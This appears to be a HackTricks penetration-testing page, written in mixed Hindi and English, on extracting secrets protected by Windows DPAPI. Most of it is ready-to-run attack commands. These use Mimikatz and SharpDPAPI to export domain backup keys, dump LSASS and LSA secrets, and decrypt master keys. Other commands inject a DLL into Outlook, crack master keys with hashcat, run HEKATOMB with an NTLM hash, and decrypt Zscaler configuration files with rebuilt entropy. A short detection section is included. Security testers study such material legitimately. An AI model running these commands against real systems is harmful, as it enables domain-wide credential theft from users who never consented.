# DPAPI - पासवर्ड निकालना

{{#include ../../banners/hacktricks-training.md}}



## DPAPI क्या है

The Data Protection API (DPAPI) का उपयोग मुख्य रूप से Windows ऑपरेटिंग सिस्टम में symmetric encryption of asymmetric private keys के लिए किया जाता है, जो user या system secrets को entropy के एक महत्वपूर्ण स्रोत के रूप में उपयोग करता है। यह तरीका डेवलपर्स के लिए एन्क्रिप्शन को सरल बनाता है क्योंकि यह उन्हें user's logon secrets से निकले हुए key या system encryption के लिए system के domain authentication secrets से निकले हुए key का उपयोग करके डेटा एन्क्रिप्ट करने की अनुमति देता है, इस प्रकार डेवलपर्स को एन्क्रिप्शन key की सुरक्षा स्वयं प्रबंधित करने की आवश्यकता समाप्त कर देता है।

The most common way to use DPAPI is through the **`CryptProtectData` and `CryptUnprotectData`** functions, जो applications को उस process के session के साथ securely डेटा एन्क्रिप्ट और डिक्रिप्ट करने की अनुमति देते हैं जो वर्तमान में logged on है। इसका मतलब है कि एन्क्रिप्ट किया गया डेटा केवल उसी user या system द्वारा डिक्रिप्ट किया जा सकता है जिसने उसे एन्क्रिप्ट किया था।

Moreover, these functions accepts also an **`entropy` parameter** जिसका उपयोग encryption और decryption के दौरान भी किया जाता है; इसलिए, किसी चीज़ को डिक्रिप्ट करने के लिए जिसे इस parameter का उपयोग करके एन्क्रिप्ट किया गया था, आपको वही entropy value प्रदान करनी होगी जिसका उपयोग एन्क्रिप्शन के समय किया गया था।

### Users की key जनरेशन

DPAPI प्रत्येक user के लिए उनके credentials के आधार पर एक unique key (जिसे **`pre-key`** कहा जाता है) जनरेट करता है। यह key user's password और अन्य फैक्टर्स से निकाली जाती है और algorithm user के प्रकार पर निर्भर करता है पर अंततः यह SHA1 होती है। उदाहरण के लिए, domain users के लिए, **यह user के NTLM hash पर निर्भर करता है**।

यह विशेष रूप से दिलचस्प है क्योंकि अगर attacker user का password hash प्राप्त कर लेता है, तो वे:

- **DPAPI का उपयोग करके एन्क्रिप्ट किए गए किसी भी डेटा को** उस user's key के साथ डिक्रिप्ट कर सकते हैं बिना किसी API से संपर्क किए
- ऑफ़लाइन वैध DPAPI key जनरेट करने की कोशिश करके **crack the password** कर सकते हैं

इसके अलावा, हर बार जब कोई user DPAPI का उपयोग करके कोई डेटा एन्क्रिप्ट करता है, तो एक नया **master key** जनरेट होता है। यह master key ही वास्तव में डेटा को एन्क्रिप्ट करने के लिए उपयोग किया जाता है। प्रत्येक master key को पहचानने के लिए एक **GUID** (Globally Unique Identifier) दिया जाता है।

master keys **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** डायरेक्टरी में स्टोर होते हैं, जहाँ `{SID}` उस user का Security Identifier है। master key user's **`pre-key`** द्वारा एन्क्रिप्ट करके स्टोर किया जाता है और recovery के लिए एक **domain backup key** द्वारा भी (इसलिए वही key दो अलग-अलग पास के द्वारा दो बार एन्क्रिप्ट करके स्टोर होती है)।

ध्यान दें कि **master key को एन्क्रिप्ट करने के लिए उपयोग किया गया domain key domain controllers में होता है और कभी नहीं बदलता**, इसलिए यदि attacker के पास domain controller तक पहुँच है, तो वे domain backup key प्राप्त कर सकते हैं और domain के सभी users के master keys को डिक्रिप्ट कर सकते हैं।

एन्क्रिप्ट किए गए blobs में उनके headers के अंदर डेटा एन्क्रिप्ट करने के लिए उपयोग किए गए **master key का GUID** होता है।

> [!TIP]
> DPAPI encrypted blobs starts with **`01 00 00 00`**

मास्टर keys खोजें:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### मशीन/सिस्टम की कुंजी निर्माण

यह वह key है जिसका उपयोग मशीन द्वारा डेटा को encrypt करने के लिए किया जाता है। यह **DPAPI_SYSTEM LSA secret** पर आधारित है, जो एक विशेष key है जिसे केवल SYSTEM user ही access कर सकता है। इस key का उपयोग उन डेटा को encrypt करने के लिए किया जाता है जिन्हें सिस्टम स्वयं द्वारा access करने की आवश्यकता होती है, जैसे कि machine-level credentials या system-wide secrets।

ध्यान दें कि इन keys का **domain backup** नहीं होता है इसलिए वे केवल लोकली ही उपलब्ध होते हैं:

- **Mimikatz** इसे access कर सकता है LSA secrets dump करके कमांड चलाकर: `mimikatz lsadump::secrets`
- यह secret registry के अंदर स्टोर होता है, इसलिए एक administrator DACL permissions को modify करके इसे access कर सकता है। registry path है: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`


### DPAPI द्वारा संरक्षित डेटा

DPAPI द्वारा संरक्षित व्यक्तिगत डेटा में शामिल हैं:

- Windows creds
- Internet Explorer and Google Chrome's passwords and auto-completion data
- E-mail and internal FTP account passwords for applications like Outlook and Windows Mail
- Passwords for shared folders, resources, wireless networks, and Windows Vault, including encryption keys
- Passwords for remote desktop connections, .NET Passport, and private keys for various encryption and authentication purposes
- Network passwords managed by Credential Manager and personal data in applications using CryptProtectData, such as Skype, MSN messenger, and more
- Encrypted blobs inside the register
- ...

सिस्टम द्वारा संरक्षित डेटा में शामिल हैं:
- Wifi passwords
- Scheduled task passwords
- ...

### Master key निकालने के विकल्प

- यदि user के पास domain admin privileges हैं, तो वे **domain backup key** को access कर सकते हैं ताकि domain में सभी user master keys को decrypt किया जा सके:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- With local admin privileges, it's possible to **LSASS memory तक पहुँच** कर सभी जुड़े हुए उपयोगकर्ताओं के DPAPI master keys और SYSTEM key निकालना संभव है।
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- यदि उपयोगकर्ता के पास local admin privileges हैं, तो वे **DPAPI_SYSTEM LSA secret** तक पहुँच कर machine master keys को decrypt कर सकते हैं:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- यदि user का password या NTLM hash ज्ञात हो, तो आप **user की master keys को सीधे decrypt कर सकते हैं**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- यदि आप user के रूप में एक session के अंदर हैं, तो DC से **backup key to decrypt the master keys using RPC** माँगा जा सकता है। यदि आप local admin हैं और user logged in है, तो आप इसके लिए **steal his session token** कर सकते हैं:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## वॉल्ट की सूची
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## DPAPI एन्क्रिप्टेड डेटा तक पहुँच

### DPAPI एन्क्रिप्टेड डेटा खोजें

सामान्य उपयोगकर्ताओं की **सुरक्षित फ़ाइलें** निम्न स्थानों में होती हैं:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- ऊपर दिए गए पाथों में `\Roaming\` को `\Local\` में बदलकर भी जाँचें।

Enumeration examples:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) DPAPI encrypted blobs को file system, registry और B64 blobs में खोज सकता है:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
ध्यान दें कि [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (इसी repo से) का उपयोग DPAPI द्वारा cookies जैसी संवेदनशील जानकारी को डिक्रिप्ट करने के लिए किया जा सकता है।

### पहुँच कुंजियाँ और डेटा

- **Use SharpDPAPI** वर्तमान सत्र की DPAPI एन्क्रिप्टेड फ़ाइलों से क्रेडेंशियल प्राप्त करने के लिए:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **क्रेडेंशियल जानकारी प्राप्त करें** जैसे एन्क्रिप्टेड डेटा और guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **masterkeys तक पहुँच**:

RPC का उपयोग करके उस उपयोगकर्ता की masterkey को डिक्रिप्ट करें जिसने **domain backup key** का अनुरोध किया था:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
**SharpDPAPI** टूल masterkey को डिक्रिप्ट करने के लिए इन arguments को भी सपोर्ट करता है (ध्यान दें कि `/rpc` का उपयोग domains का backup key प्राप्त करने के लिए, `/password` का उपयोग plaintext password इस्तेमाल करने के लिए, या `/pvk` का उपयोग DPAPI domain private key फ़ाइल निर्दिष्ट करने के लिए किया जा सकता है...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **data को masterkey का उपयोग करके Decrypt करें**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
The **SharpDPAPI** टूल `credentials|vaults|rdg|keepass|triage|blob|ps` डिक्रिप्शन के लिए भी इन arguments का समर्थन करता है (ध्यान दें कि `/rpc` का उपयोग domain का backup key प्राप्त करने के लिए, `/password` का उपयोग plaintext password के लिए, `/pvk` एक DPAPI domain private key फ़ाइल निर्दिष्ट करने के लिए, और `/unprotect` वर्तमान यूज़र के session का उपयोग करने के लिए किया जा सकता है...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- कुछ डेटा को **वर्तमान उपयोगकर्ता सत्र** का उपयोग करके डिक्रिप्ट करें:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
### वैकल्पिक **Entropy** ("Third-party entropy") को संभालना

कुछ एप्लिकेशन `CryptProtectData` को एक अतिरिक्त **entropy** मान देती हैं। इस मान के बिना blob को डिक्रिप्ट नहीं किया जा सकता, भले ही सही masterkey ज्ञात हो। इसलिए इस तरह संरक्षित क्रेडेंशियल्स (जैसे Microsoft Outlook, कुछ VPN clients) को लक्षित करते समय **entropy** प्राप्त करना अनिवार्य है।

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) एक user-mode DLL है जो target process के अंदर DPAPI functions को hook करती है और सप्लाई किए गए किसी भी optional **entropy** को पारदर्शी रूप से रिकॉर्ड करती है। EntropyCapture को **DLL-injection** मोड में `outlook.exe` या `vpnclient.exe` जैसे processes के खिलाफ चलाने से एक फाइल आउटपुट होगी जो प्रत्येक **entropy** buffer को कॉल करने वाले process और blob के साथ मैप करती है। कैप्चर की गई **entropy** को बाद में **SharpDPAPI** (`/entropy:`) या **Mimikatz** (`/entropy:<file>`) को सप्लाई करके डेटा को डिक्रिप्ट किया जा सकता है।
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### मास्टरकीज़ को ऑफ़लाइन क्रैक करना (Hashcat & DPAPISnoop)

Microsoft ने Windows 10 v1607 (2016) से **context 3** masterkey फ़ॉर्मेट पेश किया। `hashcat` v6.2.6 (December 2023) ने hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) और **22102** (context 3) जोड़े, जिससे masterkey फ़ाइल से सीधे उपयोगकर्ता पासवर्ड्स की GPU-त्वरित क्रैकिंग संभव हो गई। इसलिए हमलावर लक्षित सिस्टम के साथ इंटरैक्ट किए बिना word-list या brute-force हमले कर सकते हैं।

`DPAPISnoop` (2024) इस प्रक्रिया को स्वचालित करता है:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
यह टूल Credential और Vault blobs को भी पार्स कर सकता है, उन्हें cracked keys से डिक्रिप्ट करके cleartext पासवर्ड्स एक्सपोर्ट कर सकता है।

### अन्य मशीन का डेटा एक्सेस करें

In **SharpDPAPI and SharpChrome** आप रिमोट मशीन के डेटा तक पहुँचने के लिए **`/server:HOST`** ऑप्शन दे सकते हैं। बेशक आपको उस मशीन तक पहुँच होना चाहिए और निम्न उदाहरण में माना गया है कि **डोमेन बैकअप एन्क्रिप्शन की कुंजी ज्ञात है**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## अन्य टूल

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) एक टूल है जो LDAP डायरेक्टरी से सभी उपयोगकर्ताओं और कंप्यूटरों को निकालने और RPC के माध्यम से domain controller backup key एक्स्ट्रैक्ट करने को ऑटोमेट करता है। स्क्रिप्ट फिर सभी कंप्यूटरों के IP पते रेज़ॉल्व करेगी और smbclient चला कर सभी कंप्यूटरों से सभी उपयोगकर्ताओं के सभी DPAPI blobs प्राप्त करेगी और domain backup key से सब कुछ decrypt कर देगी।

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP से निकाली गई कंप्यूटर सूची के साथ आप हर सब-नेटवर्क खोज सकते हैं, भले ही आप उन्हें पहले न जानते हों!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) स्वचालित रूप से DPAPI द्वारा सुरक्षित secrets को डंप कर सकता है। 2.x रिलीज़ ने निम्न जोड़े:

* सैकड़ों होस्ट्स से blobs का पैरेलल कलेक्शन
* **context 3** masterkeys का पार्सिंग और स्वचालित Hashcat cracking इंटीग्रेशन
* Chrome "App-Bound" encrypted cookies के लिए सपोर्ट (अगला सेक्शन देखें)
* नए **`--snapshot`** मोड से endpoints को बार-बार पोल किया जा सकता है और नए बने blobs का diff लिया जा सकता है

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) masterkey/credential/vault फाइलों के लिए एक C# पार्सर है जो Hashcat/JtR फ़ॉर्मैट्स आउटपुट कर सकता है और ऑप्शनल रूप से क्रैकिंग को स्वतः invoke कर सकता है। यह Windows 11 24H1 तक के machine और user masterkey फॉर्मैट्स को पूरी तरह सपोर्ट करता है।


## सामान्य डिटेक्शन्स

- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` और अन्य DPAPI-संबंधित डायरेक्टरीज़ में फाइलों तक पहुँच।
- विशेषकर नेटवर्क शेयर जैसे **C$** या **ADMIN$** से।
- LSASS memory तक पहुँचने या masterkeys डंप करने के लिए **Mimikatz**, **SharpDPAPI** या समान टूलिंग का उपयोग।
- Event **4662**: *An operation was performed on an object* – इसे **`BCKUPKEY`** ऑब्जेक्ट तक पहुँच के साथ correlate किया जा सकता है।
- Event **4673/4674** जब कोई प्रोसेस *SeTrustedCredManAccessPrivilege* (Credential Manager) अनुरोध करता है

---
### 2023-2025 कमजोरियाँ और इकोसिस्टम परिवर्तन

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023). नेटवर्क एक्सेस वाला एक अटैकर एक domain member को धोखा दे सकता था कि वह malicious DPAPI backup key प्राप्त करे, जिससे user masterkeys का डिक्रिप्शन संभव हो जाता। यह नवंबर 2023 के cumulative update में पैच किया गया — एडमिनिस्ट्रेटर्स को सुनिश्चित करना चाहिए कि DCs और workstations पूरी तरह patched हों।
* **Chrome 127 “App-Bound” cookie encryption** (July 2024) ने legacy DPAPI-only प्रोटेक्शन के अलावा एक अतिरिक्त key जोड़ी जो यूज़र के **Credential Manager** में स्टोर होती है। अब cookies का ऑफ़लाइन डिक्रिप्शन करने के लिए DPAPI masterkey और **GCM-wrapped app-bound key** दोनों की आवश्यकता होती है। SharpChrome v2.3 और DonPAPI 2.x यूज़र कॉन्टेक्स्ट में चलाकर अतिरिक्त key recover कर सकते हैं।


### केस स्टडी: Zscaler Client Connector – SID से निकाली गई कस्टम एंट्रॉपी

Zscaler Client Connector कई configuration फाइलें `C:\ProgramData\Zscaler` के अंतर्गत स्टोर करता है (जैसे `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`)। हर फाइल **DPAPI (Machine scope)** से एन्क्रिप्टेड है लेकिन vendor **custom entropy** देता है जो डिस्क पर स्टोर होने के बजाय *calculated at runtime* होती है।

एंट्रॉपी दो तत्वों से पुनर्निर्मित की जाती है:

1. `ZSACredentialProvider.dll` के अंदर एम्बेडेड एक हार्ड-कोडेड सीक्रेट।
2. उस Windows खाते का **SID** जिससे कॉन्फ़िगरेशन संबंधित है।

DLL द्वारा लागू किया गया एल्गोरिथ्म इसके समतुल्य है:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
क्योंकि यह गुप्त जानकारी एक DLL में एम्बेड है जिसे डिस्क से पढ़ा जा सकता है, **कोई भी स्थानीय हमलावर जिसके पास SYSTEM अधिकार हैं किसी भी SID के लिए entropy पुनःजनरेट कर सकता है** और blobs को offline डिक्रिप्ट कर सकता है:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
डिक्रिप्शन पूरी JSON कॉन्फ़िगरेशन देता है, जिसमें हर **device posture check** और उसका अपेक्षित मान शामिल है – जानकारी जो client-side bypasses का प्रयास करते समय बहुत मूल्यवान होती है।

> TIP: अन्य encrypted artefacts (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) DPAPI के साथ **without** entropy (`16` zero bytes) से सुरक्षित हैं। इसलिए SYSTEM privileges प्राप्त होते ही इन्हें सीधे `ProtectedData.Unprotect` से डिक्रिप्ट किया जा सकता है।

## संदर्भ

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)

{{#include ../../banners/hacktricks-training.md}}
